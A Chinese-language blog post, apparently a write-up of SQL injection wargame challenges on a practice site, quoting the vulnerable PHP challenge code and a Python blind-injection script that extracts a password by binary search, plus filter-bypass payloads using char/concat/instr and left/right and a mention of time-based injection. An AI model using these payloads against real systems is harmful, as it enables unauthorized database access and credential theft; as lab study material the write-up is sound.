---
title: 几道sql
date: 2017-10-26 16:21:53
tags: [记录,sqlid,audit]
categories:

---

## 0x00.前言

今天在一个网站上做sql注入的题，有几道题，感觉挺有意思的。

一.题目链接: http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php

代码：

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

这代码够简单的啦，还带回显的。看了看最后，估计是要我们盲注得到pw，这还不简单？写个脚本跑去来，得到pw长度，二分法去提取好了。

```php
pw='' || length(pw)>0
.
.
pw='' || ascii(substr(pw,1,1))>0
.
.
```

对，确实如此，但是实际上我按上面那种方法怎么爆破都不对，甚至怀疑过我的代码，出轨了？

<!-- more -->

## 0x01.渐悟

想了一会，我才突然发现，我取错行了，这个表应该有好几行，但是我要的admin不在第一行。这就...

接下来目标就是如何取得我要的那一行，并且可以盲注的limit ,order by,desc等等，这里我就用了这一种方式

![9](https://myndtt.github.io/images/9.png)

## 0x02.解决

但知道重点以后就是改一下代码了

```python
import urllib
import urllib2
def getlength():
    url = 'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='
    s=0
    t=30
    while (s<t):
        if (t-s==1):
            if doinject('\'||ascii(id)=97%26%26length(pw)='+str(t)+'%23'):
                m=t
                break
            else:
                m=s
                break
        m=(s+t)/2
        if doinject('\'||ascii(id)=97%26%26length(pw)>'+str(m)+'%23'):
            s=m+1
        else:
            t=m
    print '[*]length is %s' % m
    return m
def doinject(payload):
    url = 'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='
    #print payload
    url=url+payload
    #print url
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    info = { 'User-Agent' : user_agent,
                'cookie':'__cfduid=dad2e2829958f82d5741ad845023671931508994468; PHPSESSID=4jr3sjglvj111r061sif5d2m51'
              }
    req = urllib2.Request(str(url),headers=info)
    response = urllib2.urlopen(req)
    the_page = response.read()
    #print the_page
    if (the_page.find("Hello admin")>1):
        return True
    else:
        return False
    
if __name__=='__main__':
		a=getlength()+1
		res = ""
		for i in range(1,a):
			s=0
			t=127
			while (s<t):
				if (t-s==1):
					if doinject('\'||ascii(id)=97%26%26ascii(substr(pw,'+str(i)+',1))='+str(t)+'%23'):#important 
						m=t
						break
					else:
						m=s
						break
				m=(s+t)/2
				if doinject('\'||ascii(id)=97%26%26ascii(substr(pw,'+str(i)+',1))>'+str(m)+'%23'):
					s=m+1
				else:
					t=m
			res = res+chr(m)
			print '[*]%s'% res
		print '[*] ok ! get it!'
```

这里直接 ||ascii(id)=97就是获取id那一列首字母为a的行,正如你看到的，如果有两行首字母都是a的话，这种方法就不可以，不过但order limit等关键字被过滤时，可以用此方法一试。

## 0x03.新的风暴

接着往后面做题目，遇到了这道题。

二。题目链接:http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php

代码：

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

跟上面那题一样，还是去爆破，关键点在NO上，只是要如何绕过那些个正则，随便搜一下手册，就可以找到很多办法。下面这篇文章就总结了一些：

http://www.cnblogs.com/xiangxiaodong/archive/2011/02/21/1959589.html

关键在于一个ord(正则了or)不能用，我们要取出字符可以用左右法，left(a,n),right(a,n)。函数功能分别为取出字符串a最左边n个，最右边n个。然后根据前面写下的脚本改一下，重要就是四个判断改变

```php
            if doinject('||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26length(pw)>'+str(m)+'%23'):
----------------------------
        if doinject('||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26length(pw)>'+str(m)+'%23'):
-----------------------------
					if doinject('||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26right(left(pw,'+str(i)+'),1)%0ain(char('+str(t)+'))%23'):#important 
----------------------------
				if doinject('||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26right(left(pw,'+str(i)+'),1)>(char('+str(m)+'))%23'):
```

记住不能有任何偏差。

## 0x04.暂时

![10](https://myndtt.github.io/images/10.png)



后面一道题脚本有些跑不动了 密码太长了 明天继续...

## 0x05.阳光穿破黑夜

继续往后面做，昨天那个密码好长网上搜了一下原来是因为文字原因...也是从此知道原来早就有人写了writeup

http://b.fantazm.net/category/wargame/-los.eagle-jump.org ....

没关系好好看看别人写的也很好。很明显，遍历是没有二分来的高效的啊…… 做到后面题目都感觉差不多了。

题目链接:http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php

代码：

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();

  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }

  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

  if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
  if(strlen($_GET[flag])>100) exit("HeHe");

  $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

  @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
  @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

  $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

  if($realflag[flag] === $_GET[flag]) solve("umaru");
?>
```

老感觉题目似曾相识，按照代码意思，就是猜得flag，但是只要猜错了就原来的flag就是替换掉。仔细分析代码的，第一次的tempflag取自于realflag,只是后面

```
@mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");
```

立即替换了,这里用了@,屏蔽了错误消息。然后我们就要在这动心思。我们要让这句话失效，同时因为又没有回显，看看过滤的字符，我们可以用时间盲注。然后就是构造语句。

![11](https://myndtt.github.io/images/11.png)

ok 一切明了啦，就差写脚本。说实话，时间盲注要计算好时间，毕竟通信不是那么时效。

## 0x06.总结

做了这些个题目，总之在与数据库交互的地方，仅仅只用黑名单是很蠢的。各种被绕过。。。

![12](https://myndtt.github.io/images/12.png)